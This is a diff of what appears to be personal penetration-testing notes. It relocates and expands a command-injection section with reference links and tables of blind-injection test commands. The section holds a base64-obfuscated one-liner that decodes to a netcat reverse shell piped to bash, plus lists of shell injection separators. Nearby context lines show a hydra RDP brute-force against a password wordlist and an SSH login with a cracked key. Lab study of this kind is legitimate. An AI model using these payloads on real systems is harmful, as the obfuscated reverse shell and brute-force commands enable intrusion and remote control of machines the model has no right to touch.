@@ -3008,26 +3008,7 @@ hydra -t 1 -V -f -l administrator -P Desktop/rockyou.txt rdp://192.168.100.55
 	3) Connect up like so: ssh -i id_rsa daniela@192.168.50.244
 		Enter in the password found from john. id_rsa is required to be specified during connection
   
-  # Command Injection
-
- 	Base64:	
-  		echo $command | base64 
-		echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxiYXNoIC1pIDI+JjF8bmMgMTkyLjE2OC40NS4yMzcgNDQzID4vdG1wL2Y= | base64 -d | bash	
-  		$(echo "BASE64_ENCODED_COMMAND" | base64 -d)
-
-	Injection Chars:
-		&
-		;
-		Newline (0x0a or \n)
-		&&
-		|
-		||
-
-	  Tricks:
-	  	Read the PHP file to see what exactly is blocked.
-	   		"cat injection.php"
-     
-  # Wordpress
+   # Wordpress
 
  	Reverse Shell Via Theme Editor: 
 		1) On the WordPress dashboard, click on Appearance → Themes → Theme File Editor
@@ -3249,4 +3230,38 @@ Note 2: If you get a notice that the port is in use, even after you have killed 
 
 ```
 
+  
+  # Command Injection
+	Reference:
+		1) https://book.hacktricks.xyz/pentesting-web/command-injection
+        	2) https://github.com/payloadbox/command-injection-payload-list
+ 	Base64:	
+  		echo $command | base64 
+		echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxiYXNoIC1pIDI+JjF8bmMgMTkyLjE2OC40NS4yMzcgNDQzID4vdG1wL2Y= | base64 -d | bash	
+  		$(echo "BASE64_ENCODED_COMMAND" | base64 -d)
+
+	Injection Chars:
+		&
+		;
+		Newline (0x0a or \n)
+		&&
+		|
+		||
+
+	  Tricks:
+	  	Read the PHP file to see what exactly is blocked.
+	   		"cat injection.php"
+
+	Linux Blind   | Description
+	______________|_____________
+	whoami        | See what user the application is running under
+	nc            | Reverse Shell
+	ping          | Causes application to hang. Useful for testing blind command injection
+	sleep         | Useful for testing blind command injection
+	wget          | Check HTTP Server Logs to see if you get a request
+
+	Windows Blind | Description
+	______________|_____________
+	ping          | Cases application to hang. Useful for testing blind command injection
+	timeout       | Causes application to hang. Useful if ping is not installed
    
